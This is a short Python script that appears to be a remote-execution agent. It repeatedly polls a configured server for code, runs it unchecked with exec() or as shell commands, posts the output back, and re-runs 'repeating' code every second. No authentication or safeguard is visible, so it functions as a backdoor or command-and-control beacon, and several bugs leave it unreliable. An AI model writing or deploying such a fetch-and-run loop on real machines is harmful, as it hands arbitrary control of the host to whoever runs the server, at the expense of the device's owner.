import requests
import config as config
import functions
import subprocess
import sys
import io
import time

deviceId = config.deviceId
clearBufferUrl = config.clearBufferUrl
getProcessUrl = config.getProcessUrl
postResultUrl = config.postResultUrl
processID = 1
repeatingCommands = []

deviceData = {
    'deviceId': deviceId
}

response1 = requests.post(clearBufferUrl, json=deviceData)
if (response1.status_code == 200):
    print("bufferCleared")

while True:
    processData = {
    "deviceId" : deviceId,
    "processID" : str(processID)
    }
    response2 = requests.post(getProcessUrl,json=processData)
    process = response2.json()["process"]
    if process == "empty":
        pass
    elif process["compiled"] == True:
        pass
    elif process["compiled"] == False:
        code = process["code"]
        if process["reapeating"] == True:
            repeatingCommands.append(code)
        elif process["type"] == "python":
            try:
                output = io.StringIO()
                sys.stdout = output
                exec(code)
                sys.stdout = sys.__stdout__
                captured_output = output.getvalue()
                output.close()
                status = ("compilation succesfull",captured_output)
            except Exception as e:
                status = ("compilation failed!",e)
                # status = executePythonCommand(code)
        elif process['type'] == "CMD":
            try:
                result = subprocess.run(code, shell=True, capture_output=True, text=True)
                status = ("compilation succesfull",result.stdout)
            except Exception as e:
                status("compilation failed!",e)
                # status = executeCMDcommand(code)
        responseData = {
            "deviceId" : deviceId,
            "processID" : str(processID),
            "response" : status
        }
        response3 = requests.post(postResultUrl,json=responseData)
        if response3.status_code == 200:
            processID+=1
    
    for i in repeatingCommands:
        try:
            exec(i)
        except:
            pass
    time.sleep(1)